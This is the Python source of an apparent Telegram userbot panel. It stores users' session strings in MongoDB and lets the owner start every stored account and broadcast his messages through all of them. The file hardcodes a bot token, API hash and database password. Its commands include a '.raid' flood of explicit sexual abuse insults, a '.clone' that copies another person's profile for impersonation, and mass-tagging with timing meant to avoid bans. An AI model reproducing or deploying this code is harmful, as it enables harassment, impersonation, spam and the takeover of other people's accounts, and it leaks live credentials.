import asyncio
import os
import sys
import random
import json
import time
from flask import Flask
from threading import Thread
from pymongo import MongoClient

# --- EMERGENCY LOOP INJECTOR FOR PYTHON 3.14+ ---
try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

from pyrogram import Client, filters, errors, handlers, idle, utils
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.raw import types, functions

# --- TIME STAMP FOR UPTIME ---
BOT_START_TIME = time.time()

# --- CONFIGURATION ---
API_ID = 31980984
API_HASH = "a61358dd3cd8c3a56cd53d9ddd8a0c67"
BOT_TOKEN = "8709782891:AAHhT65venvu-KbJO8Q7zJoBcMXNdrj7deo"
LOG_GROUP = -1003867805165 

# INTEGRATED MONGODB URL
MONGO_URL = "mongodb+srv://misssqn_db_user:Nova01@cluster0.6xxsrwq.mongodb.net/?retryWrites=true&w=majority"

# FORCE JOIN CHANNELS/GROUPS
FSUB_CHANNELS = [
    "NovaBot_Support",
    "Friend_Forevrrr",
    "Villain_Loves",
    "SticrAura"
]

# STYLISH MEDIA LINKS
START_VIDEO = "https://files.catbox.moe/pnaxj0.mp4"
ALIVE_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"

OWNER_ID = 8724182918
OWNER_USERNAME = "@CoderNova"

# --- MONGODB STORAGE CORE SYSTEM ---
try:
    mongo_client = MongoClient(MONGO_URL)
    db = mongo_client["CoderNovaBotDB"]
    sessions_col = db["sessions"]
    users_col = db["users"] # For tracking bot users
    print("[SUCCESS] MongoDB Database Connected Successfully!")
except Exception as e:
    print(f"[ERROR] MongoDB Connection Failed: {e}")
    sys.exit(1)

def load_local_sessions():
    try:
        data = {}
        for document in sessions_col.find():
            data[str(document["user_id"])] = document["session_str"]
        return data
    except Exception: 
        return {}

def save_local_session(user_id, session_str):
    try:
        sessions_col.update_one(
            {"user_id": str(user_id)},
            {"$set": {"session_str": session_str}},
            upsert=True
        )
    except Exception as e:
        print(f"[ERROR] Failed to save session to Mongo: {e}")

def remove_local_session(user_id):
    try:
        sessions_col.delete_one({"user_id": str(user_id)})
    except Exception:
        pass

def wipe_all_sessions_from_db():
    try:
        sessions_col.delete_many({})
        return True
    except Exception:
        return False

# --- USER TRACKING FOR BROADCAST ---
def add_bot_user(user_id):
    try:
        users_col.update_one({"user_id": int(user_id)}, {"$set": {"user_id": int(user_id)}}, upsert=True)
    except Exception:
        pass

def get_all_bot_users():
    try:
        return [doc["user_id"] for doc in users_col.find()]
    except Exception:
        return []

def get_readable_time(seconds: int) -> str:
    count = 0
    ping_time = ""
    time_list = []
    time_suffix_list = ["s", "m", "h", "ᴅᴀʏs"]
    while count < 4:
        count += 1
        if count < 3: remaining, time_to_add = divmod(seconds, 60)
        else: remaining, time_to_add = divmod(seconds, 24)
        if seconds == 0 and remaining == 0: break
        time_list.append(int(time_to_add))
        seconds = int(remaining)
    for x in range(len(time_list)):
        time_list[x] = str(time_list[x]) + time_suffix_list[x]
    if len(time_list) == 4:
        ping_time += time_list.pop() + ", "
    time_list.reverse()
    ping_time += ":".join(time_list)
    return ping_time

# --- WEB SERVER FOR RENDERING ---
app = Flask('')
@app.route('/')
def home(): return " can_be_rendered_online ✨"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

bot = Client("CoderNovaGen", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_data = {}
active_tasks = {}
running_ubots = {}

# --- IN-MEMORY DATA FOR FEATURES ---
afk_users = {}  
pm_guard_data = {}  

# --- SMALL CAPS KEYBOARDS & BUTTONS ---
main_buttons = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("📲 ᴀᴅᴅ ᴀᴄᴄᴏᴜɴᴛ", callback_data="add_btn"),
        InlineKeyboardButton("🛠️ ʜᴇʟᴘ ᴍᴇɴᴜ", callback_data="help_btn")
    ],
    [
        InlineKeyboardButton("👑 ᴏᴡɴᴇʀ", url=f"https://t.me/{OWNER_USERNAME.replace('@','') or 'CoderNova'}"),
        InlineKeyboardButton("📢 ᴜᴘᴅᴀᴛᴇ", url="https://t.me/NovaBot_Support")
    ],
    [
        InlineKeyboardButton("📖 ɢᴜɪᴅᴇ", callback_data="guide_btn"),
        InlineKeyboardButton("❌ ᴄʟᴏsᴇ", callback_data="close")
    ]
])

help_back_button = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="back_to_start")]
])

DAILY_CHATS = [
    "ʜɪɪ {mention}", "ᴋᴀɪsᴇ ʜᴏ {mention}", "ᴋʏᴀ ᴋʀ ʀʜᴇ ʜᴏ.. {mention}", "ᴋʜᴀ sᴇ ʜᴏ. {mention}",
    "ᴋʏᴀ ᴋʀᴛᴇ ʜᴏ {mention}", "ʀᴀᴅʜᴇ ʀᴀᴅʜᴇ {mention}", "ᴊᴀɪ sʜʀᴇᴇ ʀᴀᴍ {mention}", "ᴏʀ sᴜɴᴀᴏ sʙ ʙᴅɪʏᴀ {mention}",
    "ᴋʜᴀ ʀʜᴛᴇ ʜᴏ ᴀᴀᴊ ᴋᴀʟ ᴀᴀᴛᴇ ɴʜɪ ʜᴏ {mention}", "ᴠᴄ ᴀᴀʏᴀ ᴋʀ ʏʀ {mention}", "ɢʀᴏᴜᴘ ᴍᴇ ᴀᴀʏᴀ ᴋʀ ʏʀ {mention}",
    "ʀᴀᴍ ʀᴀᴍ {mention}", "ᴋᴋʀʜ {mention}", "ᴋʜᴀɴᴀ ᴋʜᴀʏᴇ {mention}", "ɢʜᴀʀ ᴍᴇ sʙ ᴋᴀɪsᴇ ʜʜ {mention}",
    "<b>ᴏʀ ᴘᴀᴅʜᴀɪ ᴋᴀɪsᴇ ᴄʜᴀʟ ʀʜᴇ ʜ</b> {mention}", "sᴛᴜᴅʏ ᴋʀᴛᴇ ʜᴏ ʏᴀ ɴʜɪ {mention}"
]

ABUSE_RAIDS = [
    "🥵💦 JUNGLE JUNGLE ME CHALA.... JUNGLE ME MILA BHALU... 🤣🤣🤣🤣",
    "AB KARO APNE BAAP KE SAMNE GUSTAKIYA... 😂😂 NHI TO TUMHATI AMMA CHOD DALU 💦💦",
    "EK DAAL PE.... CHAR... KABUTAR... 😁 CHARO MANGE DAANA... 😂😂😂😂",
    "TERI... DADADI.. TANG... UTHAYE... 😂 OR.. CHODE.. MERE.. NANA... 😂😂😂",
    "LAAL... DUPTTA... UAD... GYA... MERE.. HAWA KE... JHOKE... SEE... 🤣🤣 TERI... BAHNIYA.... CHOD.. DIYA.. HAAYE... RE... DHOKE.. SE.. 😂😂😂",
    "TERI.. AMMA..KA.. BHOSDA... OR... TERI.. BAHAN... KE... KAALI.. KAALI... CHUT.. 🤣🤣",
    "TERI.. BAHAN.. BEDIYO.. KO.. CHOD...KR. 🤣🤣 BACHE... HO.. GYE.. 580....🤣🤣",
    "TERI MAA KI CHUT TERI BAHAN KA BHOSDA TERI MAA CHOD DUNGA 😂😂😂| RANDI KE BACHE 💦💦🥵",
    "BHOSDIKE TERI MAA KI CHUT DUNGA RANDI KE BACHE 🥵🥵🥵🥵🥵",
    "HAWABAAAZI KREGA TERE... MAA.. CHOD... DUNGA.. 🥵💦💦💦",
    "JHULA... JHULO... LAKIN APND BAAP KO... MT BHULO... 💦🥵💦🥵🥵",
    "TOHAR... MAIYA KA... BHOSDA.. 💦🥵💦🥵💦🥵",
    "CHUD.. GYA.. 🤣🤣😂🤣 CHUD... GYA.. BETE.. 💦🥵🥵🥵🥵💦🥵",
    "BAAP.. KO... KHODNA.. OR... CHODNE.. NA.. SIKHATE... MERE.. BETE... 🥵💦🥵🥵",
    "ME.. TERA.. BAAP.. HU... RANDI.. KE.. BACHE.... 🥵💦🥵💦...",
    "TERI.. BAHAN.. KA.. BURRRR... CHODUNGA.. 🥵💦🥵💦🥵🥵",
    "CHUD... DIYA.. TERI.. BAHAH... KO.. 🥵💦🥵🥵🥵🥵",
    "TERI.. MOUSI.. KI.. CHUT... 💦💦💦",
    "TERI... BUDDHI... DADI.. KI.. CHUT.. FAAD... DUNGA 💦💦🥵🥵💦🥵💦",
    "TERI.. BAHAN... RANDI.. 🥵🥵💦🥵💦💦",
    "TERI.... MOUSI.. KI.. CHUT.. ME... HATHI.. KA.. LUND... 💦💦🥵🥵",
    "MAA.. KE... LOUDE... CHUD.. GYA 💦💦🥵💦🥵💦"
]

# --- FORCE JOIN CHECKER ---
async def check_force_join(c, user_id):
    not_joined = []
    for channel in FSUB_CHANNELS:
        try: await c.get_chat_member(channel, user_id)
        except errors.UserNotParticipant: not_joined.append(channel)
        except Exception: pass
    return not_joined

# --- USERBOT HANDLERS ---
async def alive_cmd(c, m):
    uptime = get_readable_time(int(time.time() - BOT_START_TIME))
    alive_text = (
        f"✨ **『 ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨\n\n"
        f"⚙️ **sʏsᴛᴇᴍ sᴛᴀᴛᴜs:** `sᴍᴏᴏᴛʜ ᴀs ғᴜᴄᴋ 🚀`\n"
        f"⏳ **ᴜᴘᴛɪᴍᴇ:** `{uptime}`\n"
        f"👤 **ᴜsᴇʀ:** {c.me.mention}\n"
        f"👑 **ᴏᴡɴᴇʀ:** {OWNER_USERNAME}"
    )
    try:
        await m.delete()
        await c.send_photo(m.chat.id, photo=ALIVE_IMG, caption=alive_text)
    except Exception: 
        try: await m.edit_text(alive_text)
        except Exception: pass

async def ping_cmd(c, m):
    start_time = time.time()
    try: p_msg = await m.edit_text("⚡ `ᴘɪɴɢɪɴɢ...`")
    except Exception: p_msg = await c.send_message(m.chat.id, "⚡ `ᴘɪɴɢɪɴɢ...`")
    end_time = time.time()
    ping_speed = round((end_time - start_time) * 1000, 2)
    uptime = get_readable_time(int(time.time() - BOT_START_TIME))
    try:
        await p_msg.edit_text(
            f"🚀 **『 ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴘɪɴɢ sᴛᴀᴛᴜs 』**\n\n"
            f"📶 **ᴘɪɴɢ sᴘᴇᴇᴅ:** `{ping_speed} ᴍs`\n"
            f"⏳ **ᴜᴘᴛɪᴍᴇ:** `{uptime}`\n"
            f"👤 **ᴀᴄᴄᴏᴜɴᴛ:** {c.me.mention}"
        )
    except Exception: pass

# --- ANTI-BAN TAGALL (SAFE DELAY) ---
async def tagall_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True
    input_text = m.text.split(None, 1)[1] if len(m.command) > 1 else "ʜᴇʏ, ᴋᴀʜᴀɴ ʜᴏ sʙ?"
    try: await m.delete()
    except Exception: pass
    
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid): break 
            if member.user.is_bot or member.user.is_deleted: continue
            try:
                mention = f"[{member.user.first_name or 'ᴜsᴇʀ'}](tg://user?id={member.user.id})"
                await c.send_message(m.chat.id, f"{input_text}\n\n{mention}")
                await asyncio.sleep(random.uniform(1.5, 2.0))
            except errors.FloodWait as e:
                await asyncio.sleep(e.value + 2)
            except Exception: pass
    except Exception: pass

# --- ANTI-BAN ONETAG (SAFE DELAY) ---
async def onetag_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True 
    try: await m.delete()
    except Exception: pass
    
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid): break 
            if member.user.is_bot or member.user.is_deleted: continue
            try:
                mention = f"[{member.user.first_name or 'ᴜsᴇʀ'}](tg://user?id={member.user.id})"
                msg = random.choice(DAILY_CHATS).format(mention=mention)
                await c.send_message(m.chat.id, msg)
                await asyncio.sleep(random.uniform(1.8, 2.5))
            except errors.FloodWait as e:
                await asyncio.sleep(e.value + 2)
            except Exception: pass
    except Exception: pass

# --- ANTI-BAN RAID (SAFE DELAY) ---
async def raid_cmd(c, m):
    uid = c.me.id
    args = m.text.split()
    is_private = m.chat.type in [types.ChatType.PRIVATE, types.ChatType.BOT]
    
    if not is_private and not m.reply_to_message:
        try: return await m.edit_text("❌ **ɢʀᴏuᴘ ᴍᴇ ᴋɪsɪ ᴋᴇ ᴍssɢ ᴘᴇ ʀᴇᴘʟʏ ᴋʀᴋᴇ `.raid 5` ʟɪᴋʜᴏ!**")
        except Exception: return
        
    try: count = int(args[1]) if len(args) > 1 else 10
    except ValueError: count = 10

    active_tasks[uid] = True 
    try: await m.delete()
    except Exception: pass
    reply_to_id = m.reply_to_message.id if m.reply_to_message else None

    for _ in range(count):
        if not active_tasks.get(uid): break 
        try:
            msg = random.choice(ABUSE_RAIDS)
            await c.send_message(chat_id=m.chat.id, text=msg, reply_to_message_id=reply_to_id)
            await asyncio.sleep(random.uniform(1.2, 1.8))
        except errors.FloodWait as e:
            await asyncio.sleep(e.value + 2)
        except Exception: pass

async def stop_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = False 
    try: await m.edit_text("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ 』**")
    except Exception: pass

# --- ASSISTANT HELP COMMAND ---
async def assistant_help_cmd(c, m):
    help_guide = (
        f"⚙️ **『 ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ᴍᴀsᴛᴇʀ ɢᴜɪɢᴇ 』** ⚙️\n\n"
        f"👑 **ᴏᴡɴᴇʀ:** {OWNER_USERNAME}\n"
        f"ᴘʀᴇғɪx ᴜsᴇᴅ: `.` (ᴅᴏᴛ)\n\n"
        f"🔹 **`.help`** - sʜᴏᴡs ᴛʜɪs ᴄᴏᴍᴘʀᴇʜᴇɴsɪᴠᴇ ᴍᴏᴅᴜʟᴇ ɢᴜɪᴅᴇ.\n"
        f"🔹 **`.alive`** - ᴄʜᴇᴄk ᴜsᴇʀʙᴏᴛ ᴄᴏʀᴇ ᴏᴘᴇʀᴀᴛɪᴏɴᴀʟ ʟᴏɢs & sᴛᴀᴛᴜs.\n"
        f"🔹 **`.ping`** - ᴍᴇᴀsᴜʀᴇ ᴇɴɢɪɴᴇ ʀᴇsᴘᴏɴsᴇ sᴘᴇᴇᴅ ᴀɴᴅ ᴀᴄᴛɪᴠᴇ ᴜᴘᴛɪᴍᴇ.\n"
        f"🔹 **`.tagall [text]`** - ғᴀsᴛ ᴛᴀɢ ᴀʟʟ ɢʀᴏᴜᴘ ᴍᴇᴍʙᴇʀs ᴅʏɴᴀᴍɪᴄᴀʟʟʏ.\n"
        f"🔹 **`.onetag`** - ᴀᴜᴛᴏᴍᴀᴛᴇᴅ ᴄᴀsᴜᴀʟ sɪɴɢʟᴇ ᴛᴀɢ ᴘʀᴏᴄᴇssɪɴɢ.\n"
        f"🔹 **`.raid [count]`** - ғɪre ᴇxᴘʟɪᴄɪᴛ ʀᴀᴘɪᴅ ᴀʙᴜsᴇ ʟᴏᴏᴘs ᴏɴ ᴛᴀʀɢᴇᴛs.\n"
        f"🔹 **`.afk [reason]`** - ᴇɴᴀʙʟᴇ ᴀᴜᴛᴏᴍᴀᴛᴇᴅ ᴀғᴋ ᴀᴜᴛᴏ-ʀᴇᴘʟɪᴇs sᴇᴀᴍʟᴇsssʟʏ.\n"
        f"🔹 **`.clone @username`** - ᴍɪʀʀᴏʀ/ᴄʟᴏɴᴇ ᴀɴʏᴏɴᴇ's ᴘʀᴏғɪʟᴇ ɪᴅᴇɴᴛɪᴛʏ ɪɴsᴛᴀɴᴛʟʏ.\n"
        f"🔹 **`.stop`** - ᴛᴇʀᴍɪɴᴀᴛᴇ ᴀʟʟ ᴄᴜʀʀᴇɴᴛʟʏ ᴀᴄᴛɪᴠᴇ ʟᴏᴏᴘs/ʀᴀɪᴅs ɪɴsᴛᴀɴᴛʟʏ."
    )
    try:
        await m.delete()
        await c.send_message(m.chat.id, help_guide)
    except Exception:
        try: await m.edit_text(help_guide)
        except Exception: pass

# --- SERVICE WELCOME FOR USERBOT ---
async def group_welcome_handler(c, m):
    try:
        if m.new_chat_members:
            for member in m.new_chat_members:
                if member.id == c.me.id:
                    welcome_text = (
                        f"✨ **ʜᴇʟʟᴏ ᴇᴠᴇʀʏᴏɴᴇ!** ✨\n\n"
                        f"ᴛʜᴀɴᴋs ғᴏʀ ɪɴᴠɪᴛɪɴɢ ᴍᴇ ʜᴇʀᴇ! 🤗\n"
                        f"ɪ ᴀᴍ ᴀ ᴘᴏᴡᴇʀғᴜʟ **ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ**.\n\n"
                        f"👤 **ᴍʏ ᴀᴄᴄᴏᴜɴᴛ:** {c.me.mention}\n"
                        f"🚀 **ᴍʏ ᴘᴀɴᴇʟ:** {OWNER_USERNAME}"
                    )
                    await c.send_message(m.chat.id, welcome_text)
    except Exception: pass

# --- ADDITIONAL FEATURES ---
async def afk_cmd(c, m):
    reason = m.text.split(None, 1)[1] if len(m.command) > 1 else "ʙᴜsʏ ʀɪɢʜᴛ ɴᴏᴡ."
    afk_users[c.me.id] = {"reason": reason, "time": time.time()}
    try: await m.edit_text(f"💤 **ɪ ᴀᴍ ɢᴏɪɴɢ ᴀғᴋ!**\nʀᴇᴀsᴏɴ: `{reason}`")
    except Exception: pass

async def afk_watcher_handler(c, m):
    try:
        uid = c.me.id
        if uid in afk_users and m.from_user and m.from_user.id == uid:
            afk_duration = get_readable_time(int(time.time() - afk_users[uid]["time"]))
            del afk_users[uid]
            await m.reply_text(f"☀️ **ɪ ᴀᴍ ʙᴀᴄᴋ ᴏɴʟɪɴᴇ!**\nᴡᴀs ᴀᴡᴀy ғᴏʀ: `{afk_duration}`")
            return

        if uid in afk_users and (m.mentioned or (m.reply_to_message and m.reply_to_message.from_user and m.reply_to_message.from_user.id == uid)):
            reason = afk_users[uid]["reason"]
            afk_duration = get_readable_time(int(time.time() - afk_users[uid]["time"]))
            await m.reply_text(f"🔒 **ᴜsᴇʀ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴏғғʟɪɴᴇ / ʙᴜsʏ.**\n⏳ **ᴀᴡᴀʏ sɪɴᴄᴇ:** `{afk_duration}`\n📝 **...ʀᴇᴀsᴏɴ...:** `{reason}`")
    except Exception: pass

async def clone_cmd(c, m):
    if len(m.command) < 2 and not m.reply_to_message:
        try: return await m.edit_text("❌ **ᴜsᴀɢᴇ:** `.clone @username` ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜsᴇʀ.")
        except Exception: return
    
    target = m.command[1] if len(m.command) > 1 else m.reply_to_message.from_user.id
    try: status = await m.edit_text("🔄 **ᴄʟᴏɴɪɴɢ ɪᴅᴇɴᴛɪᴛʏ... ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ.**")
    except Exception: return
    
    try:
        user = await c.get_users(target)
        first_name = user.first_name or ""
        last_name = user.last_name or ""
        full_name = f"{first_name} {last_name}".strip()
        
        try: bio = (await c.get_chat(user.id)).bio or ""
        except Exception: bio = ""
        
        photos = [p async for p in c.get_chat_photos(user.id, limit=1)]
        if photos:
            try:
                photo_file = await c.download_media(photos[0].file_id)
                await c.set_profile_photo(photo=photo_file)
                if os.path.exists(photo_file): os.remove(photo_file)
            except Exception: pass
                
        await c.update_profile(first_name=first_name, last_name=last_name, bio=bio)
        await status.edit(f"✅ **sᴜᴄᴄᴇsғᴜʟʟʏ ᴄʟᴏɴᴇᴅ:** [{full_name}](tg://user?id={user.id})")
    except Exception as e:
        await status.edit(f"❌ **ᴄʟᴏɴɪɴɢ ғᴀɪʟᴇᴅ:** `{e}`")

# --- HIGHLY OPTIMIZED ADVANCED PM GUARD (5 WARNINGS + OFFLINE AUTO-REPLY) ---
async def pm_guard_handler(c, m):
    if m.chat.type != types.ChatType.PRIVATE or m.from_user.is_bot or m.from_user.id == c.me.id:
        return
        
    try:
        if m.from_user.is_contact or m.from_user.id == OWNER_ID: 
            return
    except Exception: pass
        
    ubot_id = c.me.id
    stranger_id = m.from_user.id
    
    if ubot_id not in pm_guard_data: 
        pm_guard_data[ubot_id] = {}
        
    if stranger_id not in pm_guard_data[ubot_id]: 
        pm_guard_data[ubot_id][stranger_id] = 0
        
    pm_guard_data[ubot_id][stranger_id] += 1
    warn_count = pm_guard_data[ubot_id][stranger_id]
    
    if warn_count >= 5:
        try:
            await m.reply_text("🚨 **sᴘᴀᴍ ʟɪᴍɪᴛ ᴇxᴄᴇᴇᴅᴇᴅ! ʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ʙʟᴏᴄᴋᴇᴅ ʙʏ ᴘᴍ ᴀssɪsᴛᴀɴᴛ.**")
            await c.block_user(stranger_id)
        except Exception: pass
        del pm_guard_data[ubot_id][stranger_id]
    else:
        try:
            await m.reply_text(
                f"🔒 **ʜᴇʟʟᴏ {m.from_user.mention}! ᴏᴡɴᴇʀ ᴀʙʜɪ ᴏғғʟɪɴᴇ ʜᴀɪɴ.**\n"
                f"ᴏɴʟɪɴᴇ ᴀᴀɴᴇ ᴘᴀʀ ᴡᴏ ᴀᴀᴘᴋᴀ ᴍᴇssᴀɢᴇ ᴄʜᴇᴄᴋ ᴋᴀʀᴇɴɢᴇ. ʙᴀᴀʀ-ʙᴀᴀʀ ᴍᴇssᴀɢᴇ ᴋᴀʀᴋᴇ sᴘᴀᴍ ᴍᴀᴛ ᴋɪᴊɪʏᴇ.\n\n"
                f"⚠️ **ᴡᴀʀɴɪɴɢ:** `{warn_count}/5` (5 ᴡᴀʀɴɪɴɢs ᴘᴀʀ ᴀᴀᴘ ᴀᴜᴛᴏᴍᴀᴛɪᴄ ʙʟᴏᴄᴋ ʜᴏ ᴊᴀʏᴇɴɢᴇ)."
            )
        except Exception: pass

# --- PRE-CHECK TERMINATION HANDLER (FIXED CRASHES) ---
async def global_raw_update_protector(c, update, users, chats):
    return

def register_ubot_handlers(ubot):
    ubot.add_handler(handlers.MessageHandler(assistant_help_cmd, filters.command("help", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(ping_cmd, filters.command("ping", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(afk_cmd, filters.command("afk", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(clone_cmd, filters.command("clone", ".") & filters.me))
    
    # Watchers Sequence
    ubot.add_handler(handlers.MessageHandler(group_welcome_handler, filters.group & filters.new_chat_members))
    ubot.add_handler(handlers.MessageHandler(afk_watcher_handler, (filters.group | filters.private) & ~filters.me), group=1)
    ubot.add_handler(handlers.MessageHandler(pm_guard_handler, filters.private & ~filters.me), group=2)
    
    # Block raw updates completely
    ubot.add_handler(handlers.RawUpdateHandler(global_raw_update_protector))

# --- MASTER AUTOMATIC UPDATE SYSTEM ---
@bot.on_message(filters.command("update_all") & filters.user(OWNER_ID))
async def master_sync_update(c, m):
    status_msg = await m.reply_text("🔄 **ᴜᴘᴅᴀᴛɪɴɢ ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs...**")
    saved_sessions = load_local_sessions()
    success, failure = 0, 0
    for u_id, string in list(saved_sessions.items()):
        uid_int = int(u_id)
        if uid_int in running_ubots:
            try:
                await running_ubots[uid_int].stop()
                del running_ubots[uid_int]
            except Exception: pass
        try:
            ubot = Client(f"ubot_{uid_int}", api_id=API_ID, api_hash=API_HASH, session_string=string)
            register_ubot_handlers(ubot)
            await ubot.start()
            running_ubots[uid_int] = ubot
            success += 1
            await asyncio.sleep(1.5) # Increased delay to prevent flood limits
        except Exception: failure += 1
    await status_msg.edit(f"✅ **sʏsᴛᴇᴍ ᴀᴜᴛᴏ-sʏɴᴄ sᴜᴄᴄᴇsғᴜʟ!**\n🚀 **ᴜᴘᴅᴀᴛᴇᴅ ᴀᴄᴄᴏᴜɴᴛs:** `{success}`\n❌ **ғᴀɪʟᴜʀᴇs:** `{failure}`")

# --- MASTER REMOVE ALL SYSTEM ---
@bot.on_message(filters.command("remove_all") & filters.user(OWNER_ID))
async def master_remove_all_ubots(c, m):
    status_msg = await m.reply_text("⚠️ **ʀᴇᴍᴏᴠɪɴɢ ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs ғʀᴏᴍ ᴅᴀᴛᴀʙᴀsᴇ...**")
    
    stopped_count = 0
    for uid_int, ubot_client in list(running_ubots.items()):
        try:
            await ubot_client.stop()
            stopped_count += 1
        except Exception: pass
    running_ubots.clear()
    
    db_wiped = wipe_all_sessions_from_db()
    
    if db_wiped:
        await status_msg.edit(f"🗑️ **『 ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs ʀᴇᴍᴏᴠᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ 』**\n\n⚙️ **sᴛᴏᴘᴘᴇᴅ ʙᴏᴛs:** `{stopped_count}`\n💾 **ᴅᴀᴛᴀʙᴀsᴇ sᴛᴀᴛᴜs:** `ᴄʟᴇᴀɴᴇᴅ/ᴡɪᴘᴇᴅ`\n👑 **ᴀᴄᴛɪᴏɴ ʙʏ:** {OWNER_USERNAME}")
    else:
        await status_msg.edit("❌ **ᴅᴀᴛᴀʙᴀsᴇ ᴄʟᴇᴀɴ ᴋᴀʀɴᴇ ᴍᴇ ᴋᴏɪ ᴅɪᴋᴋᴀᴛ ᴀᴀʏɪ!**")

# --- ULTIMATE MASS BROADCAST SYSTEM (FIXED & PEER ID VALIDATION OPTIMIZED) ---
@bot.on_message(filters.command("broadcast") & filters.user(OWNER_ID))
async def main_broadcast(c, m):
    if len(m.command) < 2:
        return await m.reply_text("❌ **ᴜsᴀɢᴇ:** `/broadcast [ʏᴏᴜʀ ᴍᴇssᴀɢᴇ]`")
    
    broadcast_text = m.text.split(None, 1)[1]
    status_msg = await m.reply_text("🚀 **sᴛᴀʀᴛɪɴɢ ᴍᴀss ʙʀᴏᴀᴅᴄᴀsᴛ...**")
    
    # Part 1: Broadcast to Bot Users (Main bot users from Database)
    bot_users = get_all_bot_users()
    bot_success = 0
    for u_id in bot_users:
        try:
            await bot.send_message(u_id, broadcast_text)
            bot_success += 1
            await asyncio.sleep(0.2)
        except errors.FloodWait as e:
            await asyncio.sleep(e.value + 1)
        except Exception:
            pass
            
    # Part 2: Broadcast via Running Userbots (Each userbot broadcasts to its own independent dialogs)
    ubot_success = 0
    if running_ubots:
        for uid_int, ubot_client in running_ubots.items():
            try:
                async for dialog in ubot_client.get_dialogs():
                    try:
                        await ubot_client.send_message(dialog.chat.id, broadcast_text)
                        ubot_success += 1
                        await asyncio.sleep(0.5) # Anti-flood delay
                    except errors.FloodWait as e:
                        await asyncio.sleep(e.value + 1)
                    except Exception:
                        pass
            except Exception:
                pass
                
    await status_msg.edit(
        f"📢 **『 ʙʀᴏᴀᴅᴄᴀsᴛ sᴛᴀᴛɪsᴛɪᴄs 』**\n\n"
        f"👤 **ʙᴏᴛ ᴜsᴇʀs ʜɪᴛs:** `{bot_success}`\n"
        f"👥 **ᴜsᴇʀʙᴏᴛ ᴄʜᴀᴛs ʜɪᴛs:** `{ubot_success}`\n"
        f"✨ **ᴛᴏᴛᴀʟ sᴇɴᴛ:** `{bot_success + ubot_success}`"
    )

# --- TEXTS & CORES ---
START_TEXT = """⚡ **<b>ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴘᴀɴᴇʟ</b>** ⚡\n\nʜᴇʏ {mention},\nᴀᴀᴘ ɪs ᴍᴀɴᴀɢᴇᴍᴇɴᴛ ʙᴏᴛ ᴋɪ ᴍᴀᴅᴀᴅ sᴇ ᴀᴘɴᴇ ᴜsᴇʀʙᴏᴛ ᴋᴏ ᴄᴏᴍᴘʟᴇᴛᴇʟʏ ᴄᴏɴғɪɢᴜʀᴇ ᴀᴜʀ ᴍᴀɴᴀɢᴇ ᴋᴀʀ sᴀᴋᴛᴇ ʜᴀɪɴ.\n\n🚀 **ᴘᴏᴡᴇʀᴇᴅ ʙʏ:** {owner}\n⚙️ **sᴛᴀᴛᴜs:** `ᴀᴄᴛɪᴠᴇ & ᴏɴʟɪɴᴇ`"""
